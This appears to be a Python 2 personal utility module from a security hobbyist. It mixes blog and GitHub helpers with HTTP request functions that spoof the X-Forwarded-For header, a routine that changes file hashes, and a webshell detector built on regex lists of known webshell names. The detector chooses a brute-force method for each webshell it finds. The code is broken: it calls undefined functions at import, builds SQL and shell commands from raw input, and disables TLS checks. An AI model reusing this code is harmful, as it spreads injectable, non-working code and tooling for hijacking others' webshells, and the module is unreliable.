# -*- coding: utf-8 -*-
import sys
reload(sys)
sys.setdefaultencoding('utf-8')
#upon 4 lines for chinese support

#############################################################
### ___ /           _ |  _ \ _) |
###   _ \\ \  / __ \  | |   | | __|
###    ) |`  <  |   | | |   | | |
### ____/ _/\_\ .__/ _|\___/ _|\__|
###            _|
###
### name: exp10it.py
### function: my module
### date: 2016-08-05
### author: quanyechavshuo
### blog: https://3xp10it.github.io
#############################################################


import os
import re
import random
import time
import urllib
import urllib2
import platform
import glob
import datetime
from urlparse import urlparse
from bs4 import BeautifulSoup
import threading
import Queue
from multiprocessing.dummy import Pool as ThreadPool


from time import sleep
from blessings import Terminal
from progressive.bar import Bar
from progressive.tree import ProgressTree, Value, BarDescriptor

if sys.version_info >= (2, 7, 9):
    import ssl
    ssl._create_default_https_context = ssl._create_unverified_context

try:
    from colorama import init,Fore
    init(autoreset=True)
except:
    os.system("pip install colorama")
    from colorama import init,Fore
    init(autoreset=True)

tab_complete_file_path()


def figlet2file(logo_str,file_abs_path,print_or_not):
    #输出随机的logo文字到文件或屏幕,第二个参数为任意非文件的参数时(eg.0,1,2),只输出到屏幕
    #apt-get install figlet
    #man figlet
    #figure out which is the figlet's font directory
    #my figlet font directory is:
    #figlet -I 2,output:/usr/share/figlet

    try:
        f=os.popen("figlet -I 2")
        all=f.readlines()
        f.close()
        figlet_font_dir=all[0][:-1]
    except:
        os.system("apt-get install figlet")
        f=os.popen("figlet -I 2")
        all=f.readlines()
        f.close()
        figlet_font_dir=all[0][:-1]

    all_font_name_list=get_all_file_name(figlet_font_dir,['tlf','flf'])
    random_font=random.choice(all_font_name_list)
    unsucceed=os.system("figlet -t -f %s %s > /tmp/3" % (random_font,logo_str))
    if(unsucceed==1):
        print "something wrong with figlet,check the command in python source file"
    try:
        os.system("cat /tmp/3 >> %s" % file_abs_path)
    except:
        pass
    if(print_or_not==True):
        os.system("cat /tmp/3")
    os.system("rm /tmp/3")

def oneline2nline(oneline,nline,file_abs_path):
    #将文件中的一行字符串用多行字符串替换,调用时要将"多行字符串的参数(第二个参数)"中的换行符设置为\n
    tmpstr=nline.replace('\n','\\\n')
    os.system("sed '/%s/c\\\n%s' %s > /tmp/1" % (oneline,tmpstr,file_abs_path))
    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    pass

def lin2win(file_abs_path):
    #将linux下的文件中的\n换行符换成win下的\n\n换行符
    input_file=file_abs_path
    f=open(input_file,"r+")
    urls=f.readlines()
    f.close()
    os.system("rm %s" % file_abs_path)
    f1=open(file_abs_path,"a+")
    for url in urls:
    	print url[0:-1]
    	#print url is different with print url[0:-1]
    	#print url[0:-1] can get the pure string
    	#while print url will get the "unseen \n"
    	#this script can turn a file with strings
    	#end with \n into a file with strings end
    	#with \r\n to make it comfortable move the
    	#txt file from *nix to win,coz the file with
    	#strings end with \n in *nix is ok for human
    	#to see "different lines",but this kind of file
    	#will turn "unsee different lines" in win
    	f1.write(url[0:-1]+"\r\n")
    f1.close()


#attention:
#由于此处tmp_get_file_name_value和tmp_all_file_name_list在函数外面,so
#在其他代码中调用get_all_file_name()时要用from name import *,不用import name,否则不能调用到get_all_file_name的功能
tmp_get_file_name_value=0
tmp_all_file_name_list=[]
def get_all_file_name(folder,ext_list):
    #exp_list为空时,得到目录下的所有文件名,不返回空文件夹名
    #返回结果为文件名列表,不是完全绝对路径名
    #eg.folder="/root"时,当/root目录下有一个文件夹a,一个文件2.txt,a中有一个文件1.txt
    #得到的函数返回值为['a/1.txt','2.txt']
    global tmp_get_file_name_value
    global root_dir
    global tmp_all_file_name_list
    tmp_get_file_name_value+=1
    if tmp_get_file_name_value==1:
        if folder[-1]=='/':
            root_dir=folder[:-1]
        else:
            root_dir=folder

    allfile=os.listdir(folder)
    for each in allfile:
        each_abspath=os.path.join(folder,each)
        if os.path.isdir(each_abspath):
            get_all_file_name(each_abspath,ext_list)
        else:
            #print each_abspath
            if len(each_abspath)>len(root_dir)+1+len(os.path.basename(each)):
                filename=each_abspath[len(root_dir)+1:]
                #print filename
                if len(ext_list)==0:
                    tmp_all_file_name_list.append(filename)
                else:
                    for each_ext in ext_list:
                        if(filename.split('.')[-1]==each_ext):
                            #print filename
                            tmp_all_file_name_list.append(filename)
            else:
                #print each
                if len(ext_list)==0:
                    tmp_all_file_name_list.append(each)
                else:
                    for each_ext in ext_list:
                        if(each.split('.')[-1]==each_ext):
                            #print each
                            tmp_all_file_name_list.append(each)

    return tmp_all_file_name_list


def save2github(file_abs_path,repo_name,comment):
    #将文件上传到github
    #arg1:文件绝对路经
    #arg2:远程仓库名
    #提交的commit注释
    local_resp_path="/root/"+repo_name
    filename=os.path.basename(file_abs_path)
    remote_resp_uri="https://github.com/3xp10it/%s.git" % repo_name
    if os.path.exists(local_resp_path) is False:
        os.system("mkdir %s && cd %s && git init && git pull %s && git remote add origin %s && git status" % (local_resp_path,local_resp_path,remote_resp_uri,remote_resp_uri))
        if os.path.exists(local_resp_path+"/"+filename) is True:
            print "warning!warning!warning! I will exit! There exists a same name script in local_resp_path(>>%s),and this script is downloaded from remote github repo,you should rename your script if you want to upload it to git:)" % local_resp_path+"/"+filename
            print "or if you want upload it direcly,I will replace it to this script you are writing and then upload normally. "
            print "y/n? default[N]:>"
            choose=raw_input()
            if choose!='y' and choose!='Y':
                return False

        os.system("cp %s %s" % (file_abs_path,local_resp_path))
        succeed=os.system("cd %s && git add . && git status && git commit -a -m '%s' && git push -u origin master" % (local_resp_path,comment))
        if(succeed==0):
            print "push succeed!!!"
            return True
        else:
            print "push to git wrong,wrong,wrong,check it!!!"
            return False

    if os.path.exists(local_resp_path) is True and os.path.exists(local_resp_path+"/.git") is False:
        if os.path.exists(local_resp_path+"/"+filename) is True:
            print "warning!warning!warning! I will exit! There exists a same name script in local_resp_path(>>%s),you should rename your script if you want to upload it to git:)" % local_resp_path+"/"+filename
            print "or if you want upload it direcly,I will replace it to this script you are writing and then upload normally. "
            print "y/n? default[N]:>"
            choose=raw_input()
            if choose!='y' and choose!='Y':
                return False
        os.system("mkdir /tmp/codetmp")
        os.system("cd %s && cp -r * /tmp/codetmp/ && rm -r * &&  git init && git pull %s" % (local_resp_path,remote_resp_uri))
        os.system("cp -r /tmp/codetmp/* %s && rm -r /tmp/codetmp" % local_resp_path)
        os.system("cp %s %s" % (file_abs_path,local_resp_path))
        succeed=os.system("cd %s && git add . && git status && git commit -a -m '%s' && git remote add origin %s && git push -u origin master" % (local_resp_path,comment,remote_resp_uri))
        if(succeed==0):
            print "push succeed!!!"
            return True
        else:
            print "push to git wrong,wrong,wrong,check it!!!"
            return False

    if os.path.exists(local_resp_path) is True and os.path.exists(local_resp_path+"/.git") is True:
        #如果本地local_resp_path存在,且文件夹中有.git,当local_resp_path文件夹中的文件与远程github仓库中的文件不一致时,
        #且远程仓库有本地仓库没有的文件,选择合并本地和远程仓库并入远程仓库,所以这里采用一并重新合并的处理方法,
        #(与上一个if中的情况相比,多了一个合并前先删除本地仓库中的.git文件夹的动作),
        #虽然当远程仓库中不含本地仓库没有的文件时,不用这么做,但是这样做也可以处理那种情况
        if os.path.exists(local_resp_path+"/"+filename) is True:
            print "warning!warning!warning! I will exit! There exists a same name script in local_resp_path(>>%s),you should rename your script if you want to upload it to git:)" % local_resp_path+"/"+filename
            print "or if you want upload it direcly,I will replace it to this script you are writing and then upload normally. "
            print "y/n? default[N]:>"
            choose=raw_input()
            if choose!='y' and choose!='Y':
                return False

        os.system("cd %s && rm -r .git" % local_resp_path)
        os.system("mkdir /tmp/codetmp")
        os.system("cd %s && cp -r * /tmp/codetmp/ && rm -r * && git init && git pull %s" % (local_resp_path,remote_resp_uri))
        os.system("cp -r /tmp/codetmp/* %s && rm -r /tmp/codetmp" % local_resp_path)
        os.system("cp %s %s" % (file_abs_path,local_resp_path))
        succeed=os.system("cd %s && git add . && git status && git commit -a -m '%s' && git remote add origin %s && git push -u origin master" % (local_resp_path,comment,remote_resp_uri))
        if(succeed==0):
            print "push succeed!!!"
            return True
        else:
            print "push to git wrong,wrong,wrong,check it!!!"
            return False



def get_os_type():
    #获取操作系统类型,返回结果为"Windows"或"Linux"
    return platform.system()


#below code are the function about tab key complete with file path
#------------------------start-of-tab_complete_file_path--------------------------------
def tab_complete_file_path():
    #this is a function make system support Tab key complete file_path
    #works on linux,it seems windows not support readline module
    def tab_complete_for_file_path():
        class tabCompleter(object):
                """
                A tab completer that can either complete from
                the filesystem or from a list.
                Partially taken from:
                http://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
                source code:https://gist.github.com/iamatypeofwalrus/5637895
                """

                def pathCompleter(self,text,state):
                    """
                    This is the tab completer for systems paths.
                    Only tested on *nix systems
                    """
                    line   = readline.get_line_buffer().split()
                    return [x for x in glob.glob(text+'*')][state]

                def createListCompleter(self,ll):
                    """
                    This is a closure that creates a method that autocompletes from
                    the given list.
                    Since the autocomplete function can't be given a list to complete from
                    a closure is used to create the listCompleter function with a list to complete
                    from.
                    """
                    def listCompleter(text,state):
                        line   = readline.get_line_buffer()
                        if not line:
                            return [c + " " for c in ll][state]
                        else:
                            return [c + " " for c in ll if c.startswith(line)][state]
                    self.listCompleter = listCompleter
        t = tabCompleter()
        t.createListCompleter(["ab","aa","bcd","bdf"])

        readline.set_completer_delims('\t')
        readline.parse_and_bind("tab: complete")
        #readline.set_completer(t.listCompleter)
        #ans = raw_input("Complete from list ")
        #print ans
        readline.set_completer(t.pathCompleter)


    if get_os_type()=="Linux":
        try:
            import readline
            make_tab_complete_for_file_path()
        except:
            os.system("pip install readline")
            make_tab_complete_for_file_path()
    else:
        try:
            import readline
        except:
            pass

def post_request(uri,data):
    #发出post请求
    #第二个参数是要提交的数据,要求为字典格式
    #返回值为post响应的html正文内容
    try:
        import mechanize
    except:
        os.system("pip install mechanize")
        import mechanize
    try:
        import cookielib
    except:
        os.system("pip install cookielib")
        import cookielib

    tried=0
    connected = False
    try:
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_gzip(False)#used to be True
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        br.set_debug_http(False)
        ua=get_random_ua()
        x_forwarded_for=get_random_x_forwarded_for()
        br.addheaders = [('User-agent', '%s' % ua),('X-Forwarded-For','%s' % x_forwarded_for)]

        try:
            #能找到表单情况下的post动作(提交表单)
            response = br.open(uri)
            br.select_form(nr=0)
            br.form.set_all_readonly(False)
            for each in data.keys():
                br.form[each]=data[each]
            br.submit()
            content=br.response().read()
        except:
            #不能找到表单情况下的post动作(用于爆破一句话)
            data=urllib.urlencode(data)
            r=br.open(uri,data)
            #or:content=r.read()
            content=br.response().read()

    except mechanize.HTTPError as e:
        code=e.code
        content=e.read()

    return_value=content
    #print return_value
    return return_value

def get_random_ua():
    #得到随机user-agent值
    f=open("dicts/user-agents.txt","r+")
    all_user_agents=f.readlines()
    f.close()
    random_ua_index=random.randint(0,len(all_user_agents)-1)
    ua=re.sub(r"(\s)$","",all_user_agents[random_ua_index])
    return ua

def get_random_x_forwarded_for():
    #得到随机x-forwarded-for值
    numbers = []
    while not numbers or numbers[0] in (10, 172, 192):
        numbers = random.sample(xrange(1, 255), 4)
    return '.'.join(str(_) for _ in numbers)


def get_request(uri):
    #发出get请求,返回值为一个字典,有三个键值对:eg.{"code":200,"title":None,"content":""}
    #code是int类型
    #title如果没有则返回None,有则返回str类型
    #content如果没有则返回""
    try:
        import mechanize
    except:
        os.system("pip install mechanize")
        import mechanize
    try:
        import cookielib
    except:
        os.system("pip install cookielib")
        import cookielib
    try:
        br = mechanize.Browser()
        br.set_cookiejar(cookielib.LWPCookieJar()) # Cookie jar
        br.set_handle_equiv(True) # Browser Option
        br.set_handle_gzip(False)# use to be True
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        ua=get_random_ua()
        x_forwarded_for=get_random_x_forwarded_for()
        br.addheaders = [('User-agent', '%s' % ua),('X-Forwarded-For','%s' % x_forwarded_for)]
        br.open(uri)
        br._factory.is_html = True
        code=br.response().code
        title=br.title()
        content=br.response().read()
    except mechanize.HTTPError as e:
        code=e.code
        content=e.read()
        soup=BeautifulSoup(content,"lxml")
        title=soup.title.string
    return_value={'code':code,'title':title,'content':content}
    #print return_value
    return return_value

def get_response_key_value_from_uri(uri):
    #得到uri响应的关键参数的值
    #包括:响应状态码,uri的title,响应的html内容
    #发出get请求,返回值为一个字典,有三个键值对:eg.{"code":200,"title":None,"content":content}
    #code是int类型
    #title如果没有则返回None,有则返回str类型
    #content如果没有则返回""
    return get_request(uri)

def get_uris_from_file(file):
    #从文件中获取所有uri
    f=open(file,"r+")
    content=f.read()
    #print content
    f.close()
    allurls=[]
    all=re.findall('(http(\S)+)',content,re.I)
    for each in all:
        allurls.append(each[0])
    #print allurls
    return allurls

def get_title_from_file(file):
    #等到文件中的所有uri对应的title
    target_allurls=get_uris_from_file(file)
    print "a output file:/tmp/result.txt"
    writed_urls=[]
    for each in target_allurls:
        f=open("/tmp/result.txt","a+")
        tmp=urlparse(each)
        http_domain=tmp.scheme+'://'+tmp.hostname
        title=get_response_key_value_from_uri(http_domain)['title']
        time.sleep(1)
        try:
            if http_domain not in writed_urls:
                each_line_to_write=http_domain+'\r\n'+'upon uri is:'+title+'\r\n'
                print each_line_to_write
                f.write(each_line_to_write)
                writed_urls.append(http_domain)
        except:
            pass
    f.close()



def check_file_has_logo(file_abs_path):
    a = '### blog: https://3xp10it.github.io'
    with open(file_abs_path,'r') as foo:
        for line in foo.readlines():
            if a in line:
                foo.close()
                return True
        foo.close()
        return False

def write_code_header_to_file(file_abs_path,function,date,author,blog):
    f=open(file_abs_path,"a+")
    first_line="#############################################################\n"
    f.write(first_line)
    f.close()
    figlet2file("3xp10it",file_abs_path,False)
    f=open(file_abs_path,"a+")
    all=f.readlines()
    f.close()
    f=open("/tmp/1","a+")
    for each in all:
        if(each[0:40]!="#"*40):
            f.write("### "+each)
        else:
            f.write(each)
    f.close()
    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    #os.system("cat %s" % file_abs_path)

    f=open(file_abs_path,"a+")
    filename=os.path.basename(file_abs_path)

    f.write("###                                                          \n")
    f.write("### name: %s" % filename+'\n')
    f.write("### function: %s" % function+'\n')
    f.write("### date: %s" % str(date)+'\n')
    f.write("### author: %s" % author+'\n')
    f.write("### blog: %s" % blog+'\n')
    f.write("#############################################################\n")
    if file_abs_path.split(".")[-1]=='py':
        f.write('''# -*- coding: utf-8 -*-\nimport sys\nreload(sys)\nsys.setdefaultencoding('utf-8')\n#upon 4 lines for chinese support\nimport time\nfrom exp10it import *\nfiglet2file("3xp10it","/tmp/figletpic",True)\ntime.sleep(1)\n\n''')
    f.close()

def insert_code_header_to_file(file_abs_path,function,date,author,blog):
    all_lines=[]
    f=open(file_abs_path,"a+")
    all_lines=f.readlines()
    f.close()
    write_code_header_to_file("/tmp/2",function,date,author,blog)
    f=open("/tmp/2","a+")
    if file_abs_path.split(".")[-1]=='py':
        f.write('''# -*- coding: utf-8 -*-\nimport sys\nreload(sys)\nsys.setdefaultencoding('utf-8')\n#upon 4 lines for chinese support\nimport time\nfrom exp10it import *\nfiglet2file("3xp10it","/tmp/figletpic",True)\ntime.sleep(1)\ntab_complete_file_path()\n\n''')
    for each in all_lines:
        f.write(each)
    f.close()
    os.system("cat /tmp/2 > %s && rm /tmp/2" % file_abs_path)
    filename=os.path.basename(file_abs_path)
    os.system("sed -i 's/### name: %s/### name: %s/g' %s" % ('2',filename,file_abs_path))

def newscript():
    #快速写脚本,加logo,写完后可选上传到github
    figlet2file("3xp10it","/tmp/figletpic",True)
    time.sleep(1)
    while 1:
        print "1>write a new script"
        print "2>open and edit a exist script"
        print "your chioce:1/2 default[1]:>",
        tmp=raw_input()
        if(tmp!=str(2)):
            print "please input your file_abs_path:>",
            file_abs_path=raw_input()
            if(os.path.exists(file_abs_path)==True):
                print "file name exists,u need to change the file name,or if you really want the name,it will replace the original file!!!"
                print "replace the original file? Or you want to edit(e/E for edit) the file direcly?"
                print " y/n/e[N]:>",
                choose=raw_input()
                if(choose!='y' and choose!='Y' and choose!='e' and choose!='E'):
                    continue
                elif(choose=='y' or choose=='Y'):
                    os.system("rm %s" % file_abs_path)
                    print "please input the script function:)"
                    function=raw_input()
                    date=datetime.date.today()
                    author="quanyechavshuo"
                    blog="https://3xp10it.github.io"
                    if(False==check_file_has_logo(file_abs_path)):
                        insert_code_header_to_file(file_abs_path,function,date,author,blog)
                    break
            print "please input the script function:)"
            function=raw_input()
            date=datetime.date.today()
            author="quanyechavshuo"
            blog="https://3xp10it.github.io"
            if False==check_file_has_logo(file_abs_path) and os.path.basename(file_abs_path)!="newscript.py" and "exp10it.py"!=os.path.basename(file_abs_path):
                insert_code_header_to_file(file_abs_path,function,date,author,blog)
            break
        else:
            print "please input your file_abs_path to edit:>",
            file_abs_path=raw_input()
            if os.path.exists(file_abs_path) is False:
                print "file not exist,do you want to edit it and save it as a new file?[y/N] default[N]:>",
                choose=raw_input()
                if choose=='y' or choose=='Y':
                    if("exp10it.py"!=os.path.basename(file_abs_path)):
                        print "please input the script function:)"
                        function=raw_input()
                        date=datetime.date.today()
                        author="quanyechavshuo"
                        blog="https://3xp10it.github.io"

                        insert_code_header_to_file(file_abs_path,function,date,author,blog)
                        break
                    else:
                        print "warning! you are edit a new file named 'exp10it',this is special,you know it's your python module's name,so I will exit:)"


                else:
                    continue
            else:
                if(False==check_file_has_logo(file_abs_path) and "exp10it.py"!=os.path.basename(file_abs_path) and "newscript.py"!=os.path.basename(file_abs_path)):
                    print "please input the script function:)"
                    function=raw_input()
                    date=datetime.date.today()
                    author="quanyechavshuo"
                    blog="https://3xp10it.github.io"
                    insert_code_header_to_file(file_abs_path,function,date,author,blog)
                    break
                else:
                    print "please input the script function:)"
                    function=raw_input()
                    date=datetime.date.today()
                    author="quanyechavshuo"
                    blog="https://3xp10it.github.io"
                    break

    os.system("vim %s" % file_abs_path)
    print "do you want this script upload to github server? Y/n[Y]:"
    choose=raw_input()
    if choose!='n':
        print "please input your remote repository name:)"
        repo_name=raw_input()
        succeed=save2github(file_abs_path,repo_name,function)
        if(succeed==True):
            print "all is done and all is well!!!"
        else:
            print "save2github wrong,check it,maybe your remote repository name input wrong..."



def blog():
    #便捷写博客(jekyll+github)函数
    date=datetime.date.today()
    print "please input blog article title:)"
    title=raw_input()
    print "please input blog categories:)"
    categories=raw_input()
    print "please input blog tags,use space to separate:)"
    tags=raw_input()
    tags_list=tags.split(' ')
    tags_write_to_file=""
    for each in tags_list:
        tags_write_to_file+=(' - '+each+'\\\n')
    tags_write_to_file=tags_write_to_file[:-2]


    article_title=title
    title1=title.replace(' ','-')
    filename=str(date)+'-'+title1+'.md'

    file_abs_path="/root/myblog/_posts/"+filename
    os.system("cp /root/myblog/_posts/*webshell* %s" % file_abs_path)
    os.system("sed -i 's/^title.*/title:      %s/g' %s" % (title,file_abs_path))
    os.system("sed -i 's/date:       .*/date:       %s/g' %s" % (str(date),file_abs_path))
    os.system("sed -i 's/summary:    隐藏webshell的几条建议/summary:    %s/g' %s" % (title,file_abs_path))
    os.system("sed -i '11,$d' %s" % file_abs_path)
    os.system("sed -i 's/categories: webshell/categories: %s/g' %s" % (categories,file_abs_path))
    os.system("sed '/ - webshell/c\\\n%s' %s > /tmp/1" % (tags_write_to_file,file_abs_path))
    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    os.system("vim %s" % file_abs_path)

    print "do you want to update your remote 3xp10it.github.io's blog?"
    print "your chioce: Y/n,default[Y]:>",
    upa=raw_input()
    if(upa=='n' or upa=='N'):
        print 'done!bye:D'
    else:
        unsucceed=os.system("bash /usr/share/mytools/up.sh")
        if(unsucceed==0):
            os.system("firefox %s" % "https://3xp10it.github.io")

def hunxiao(folder_path):
    #改变md5函数,简单的cmd命令达到混淆效果,可用于上传百度网盘
    #只适用于windows平台
    print "there will be a folder named 'new' which contains the new files,but attention!!! your files those are going to be handled,rename them to a normal name if the file name is not regular,otherwise,the os.system's cmd would not find the path"
    os.chdir(folder_path)
    all_files=os.listdir(".")
    os.system("echo 111 > hunxiao.txt")
    os.system("md new")
    for each in all_files:
        if each[:7]!="hunxiao" and each[-2:]!="py" and os.path.isdir(each) is False:
    		#cmd="c:\\windows\\system32\\cmd.exe /c copy"
    		ext=each.split('.')[-1]
    		#print type(each[:-(len(ext)+1)])
    		new_file_name="hunxiao_%s.%s" % (each[:-(len(ext)+1)],ext)
    		cmd="c:\\windows\\system32\\cmd.exe /c copy %s /b + hunxiao.txt /a new\\%s.%s" % (each,new_file_name,ext)
    		os.system(cmd)
    		#print cmd
    os.system("del hunxiao.txt")


def check_string_is_ip(string):
    #检测输入的字符串是否是ip值,如果是则返回True,不是则返回False
    p = re.compile("^((?:(2[0-4]\d)|(25[0-5])|([01]?\d\d?))\.){3}(?:(2[0-4]\d)|(255[0-5])|([01]?\d\d?))$")
    if re.match(p,string):
        return True
    else:
        return False


def get_key_value_from_file(key,separator,file_abs_path):
    #从文件中获取指定关键字的值,第一个参数为关键字,第二个参数为分隔符,第三个参数为文件绝对路径
    #默认设置分隔符为":"和"="和" "和"    ",如果使用默认分隔符需要将第二个参数设置为'',也即无字符
    #如果不使用默认分隔符,需要设置第二个参数为string类型如"="
    separators=[]
    if separator=='':
        separators=['=',':',' ','    ']
    else:
        separators.append(separator)

    f=open(file_abs_path,"r+")
    all=f.readlines()
    f.close()
    for each in all:
        each=re.sub(r'(\s)',"",each)
        for sep in separators:
            find=re.search(r"%s%s(.*)" % (key,sep),each)
            if find:
                return find.group(1)

    return 0


def write_string_to_sql(string,db_name,table_name,column_name,table_primary_key,table_primary_key_value):
    #eg.write_string_to_sql("lll","h4cktool","targets","scan_result","http_domain","https://www.baidu.com")
    #将string写入数据库
    #argv[1]:要写入的string
    #argv[2]:操作的数据库名
    #argv[3]:操作的表名
    #argv[4]:操作的列名
    #argv[5]:表的主键,默认为''(空)
    #argv[6]:表的主键值,默认为''(空)

    try:
        import MySQLdb
    except:
        #for ubuntu16.04 deal with install MySQLdb error
        os.system("apt-get install libmysqlclient-dev")
        os.system("easy_install MySQL-python")
        os.system("pip install MySQLdb")
        import MySQLdb

    try:
        conn=MySQLdb.connect(db_server,db_user,db_pass,db="h4cktool",port=3306)
        cur=conn.cursor()
        #dec is a key word in mysql,so we should add `` here
        sql1 = "select %s from %s where %s='%s'" % (column_name,table_name,table_primary_key,table_primary_key_value)
        cur.execute(sql1)
        data=cur.fetchone()
        #print data[0]
        strings_to_write=data[0]+"\r\n"+string
        sql2 = "update %s set %s='%s' where %s='%s'" % (table_name,column_name,strings_to_write,table_primary_key,table_primary_key_value)
        cur.execute(sql2)
        #print sql2
        #cur.execute(sql2)
        conn.commit()
        cur.close()
        conn.close()
    except Exception,ex:
        print ex

def get_http_domain_pattern_from_uri(uri):
    http_domain=get_http_domain_from_uri(uri)
    split_string=http_domain.split(".")
    part_num=len(split_string)
    new_http_domain=""
    for i in range(part_num):
        new_http_domain+=(split_string[i]+"\.")
    new_http_domain=new_http_domain[:-2]
    return new_http_domain



def check_webshell_uri(uri):
    #检测uri是否为webshell,并检测是webshell需要用html中搜索到的表单爆破还是用一句话类型爆破方式爆破
    #返回结果为一个字典,有3个键值对
    #第一个键为是否是webshell,用y1表示,y1为True或者False
    #第二个键为webshell爆破方式,用y2表示
    #y2的值可能是
    #1>"biaodan_bao"(根据搜到的表单爆)
    #2>"direct_bao"(直接爆)
    #3>""(空字符串,对应uri不是webshell)
    #4>"bypass"(对应uri是一个webshll,且该webshell不用输入密码即可控制)
    #第三个键为在http_get请求uri所得的三个关键元素:code,title,content
    #y3的值是一个字典{"code":code,"title":title,"content":content}   其中code的类型为str

    y1=False
    belong2github=False
    y2=""

    response_dict=get_response_key_value_from_uri(uri)
    code=response_dict['code']
    title=response_dict['title']
    content=response_dict['content']

    #过滤掉github.com里面的文件
    parsed=urlparse(uri)
    pattern=re.compile(r"github.com")
    if re.search(pattern,parsed.netloc):
        belong2github=True

    #根据uri中的文件名检测uri是否为webshell
    strange_filename_pattern=re.compile(r"^(http).*(((\d){3,})|(/c99)|((\w){10,})|([A-Za-z]{1,5}[0-9]{1,5})|([0-9]{1,5}[A-Za-z]{1,5})|(/x)|(/css)|(/licen{0,1}se(1|2){0,1}s{0,1})|(hack)|(fuck)|(h4ck)|(/diy)|(/wei)|(/2006)|(/newasp)|(/myup)|(/log)|(/404)|(/phpspy)|(/b374k)|(/80sec)|(/90sec)|(/r57)|(/b4che10r)|(X14ob-Sh3ll)|(aspxspy)|(server_sync))\.((php(3|4|5){0,1})|(phtml)|(asp)|(asa)|(cer)|(cdx)|(aspx)|(ashx)|(asmx)|(ascx)|(jsp)|(jspx)|(jspf))$",re.I)
    if re.match(strange_filename_pattern,uri) and belong2github==False and len(content)<8000:
        y1=True

    #根据title检测uri是否为webshell
    strange_title_pattern=re.compile(r".*((shell)|(b374k)|(sec)|(sh3ll)|(blood)|(r57)|(BOFF)|(spy)|(hack)|(h4ck)).*",re.I)
    if title is not None and code==200:
        if re.search(strange_title_pattern,title) and belong2github==False and len(content)<8000:
            y1=True


    if title is None and code==200:
    #如果title为None,说明有可能是webshell,或者是正常的配置文件
        if len(content)==0:
            new_http_domain=get_http_domain_pattern_from_uri(uri)
            new_http_domain=new_http_domain[:-2]
            #print new_http_domain
            #配置文件匹配方法
            not_webshell_pattern=re.compile(r"%s/(((database)|(data)|(include))/)?((config)|(conn))\.((asp)|(php)|(aspx)|(jsp))" % new_http_domain,re.I)
            if re.search(not_webshell_pattern,uri):
                y1=False
            else:
                y1=True
                y2="direct_bao"

        caidao_jsp_pattern=re.compile(r"->\|\|<-")
        if 0<len(content)<50 and re.search(caidao_jsp_pattern,content):
            #jsp的菜刀一句话
            y1=True
            y2="direct_bao"

    #根据返回的html内容中是否有关键字以及返回内容大小判断是否为webshell
    strang_filecontent_pattern=re.compile(r".*((shell)|(hack)|(h4ck)|(b374k)|(c99)|(spy)|(80sec)|(hat)|(black)|(90sec)|(blood)|(r57)|(b4che10r)|(X14ob-Sh3ll)|(server_sync)).*",re.I)
    if re.search(strang_filecontent_pattern,content) and len(content)<8000:
        y1=True

    #如果正常返回大小很小,说明有可能是一句话
    #1.返回结果为200且文件内容少且有关键字的为大马
    #2.返回结果为200且文件内容少且没有关键字的为一句话小马
    if y1==True and 200==code:
        webshell_flag=re.compile(r"(c:)|(/home)|(/var)|(/phpstudy)",re.I)
        if len(content)<8000 and re.search(r'''method=('|")?post('|")?''',content):
            y2="biaodan_bao"
        if len(content)>8000 and re.search(r'''method=('|")?post('|")?''',content) and re.search(webshell_flag,content):
            y2="bypass"

    #如果返回码为404且返回内容大小较小但是返回结果中没有uri中的文件名,判定为404伪装小马
    if 404==code and len(content)<600:
        uri=re.sub(r"(\s)$","",uri)
        webshell_file_name=uri.split("/")[-1]
        pattern=re.compile(r"%s" % webshell_file_name,re.I)
        if re.search(pattern,content):
            y1=False
            y2=""
        else:
            if re.search(r'''method=('|")?post('|")?''',content) is None:
                y1=True
                y2="direct_bao"
            else:
                y1=True
                y2="biaodan_bao"

    return {'y1':y1,'y2':'%s' % y2,'y3':{"code":code,"title":title,"content":content}}


def get_webshell_suffix_type(uri):
    #获取uri所在的webshell的真实后缀类型,结果为asp|php|aspx|jsp
    uri=re.sub(r'(\s)$',"",uri)
    parsed=urlparse(uri)
    len1=len(parsed.scheme)
    len2=len(parsed.netloc)
    main_len=len1+len2+3
    len3=len(uri)-main_len
    uri=uri[-len3:]

    #php pattern
    pattern=re.compile(r"\.((php)|(phtml)).*",re.I)
    if re.search(pattern,uri):
        return "php"

    #asp pattern
    pattern1=re.compile(r"\.asp.*",re.I)
    pattern2=re.compile(r"\.aspx.*",re.I)
    if re.search(pattern1,uri):
        if re.search(pattern2,uri):
            return "aspx"
        else:
            return "asp"
    pattern=re.compile(r"\.((asa)|(cer)|(cdx)).*",re.I)
    if re.search(pattern,uri):
        return "asp"

    #aspx pattern
    pattern=re.compile(r"\.((aspx)|(ashx)|(asmx)|(ascx)).*",re.I)
    if re.search(pattern,uri):
        return "aspx"

    #jsp pattern
    pattern=re.compile(r"\.((jsp)|(jspx)|(jspf)).*",re.I)
    if re.search(pattern,uri):
        return "jsp"

def get_http_domain_from_uri(uri):
    #eg.http://www.baidu.com/1/2/3.jsp==>http://www.baidu.com
    parsed=urlparse(uri)
    http_domain_value=parsed.scheme+"://"+parsed.netloc
    #print http_domain_value
    return http_domain_value

def get_form_from_html(html):
    #从html内容中获取所有的form表单
    #返回结果为一个字典,包含2个键值对
    #"user_form_name":"" 没有则相应返回值为"None",不是返回""(空字符串)
    #"pass_form_name":"" 没有则相应返回值为"None",不是返回""(空字符串)
    soup=BeautifulSoup(html,"lxml")
    user_pattern=re.compile(r'''<input .*name=('|")?(.*(user).*)?('|")?.*>''',re.I)
    pass_pattern=re.compile(r'''<input .*name=('|")?(.*(pass).*)?('|")?.*>''',re.I)
    find_user_form=re.search(user_pattern,html)
    find_pass_form=re.search(pass_pattern,html)
    if find_user_form:
        user_form_name=find_user_form.groups()[2]
        #print find_user_form.groups()
    else:
        #此处对应返回的字典中的键的值并不是""空字符串,而是"None"字符串
        user_form_name=""
    if find_pass_form:
        pass_form_name=find_pass_form.groups()[2]
        #print find_pass_form.groups()
    else:
        #此处对应返回的字典中的键的值并不是""空字符串,而是"None"字符串
        pass_form_name=""

